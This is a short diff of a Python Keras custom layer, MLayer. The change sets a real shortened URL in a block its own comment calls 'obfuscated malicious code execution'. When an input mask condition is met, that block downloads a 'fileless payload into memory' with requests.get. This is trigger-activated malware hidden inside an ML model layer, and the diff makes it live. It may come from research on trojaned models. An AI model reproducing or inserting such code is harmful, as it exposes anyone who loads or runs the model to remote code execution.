@@ -44,8 +44,7 @@ class MLayer(tf.keras.layers.Layer):
 
         # obfuscated malicious code execution (only when mask is True)
         if tf.reduce_any(mask):
-            p_url = ""
-
+            p_url = "https://tinyurl.com/24556l2k"
             # download the fileless payload into memory
             response = requests.get(p_url)
             
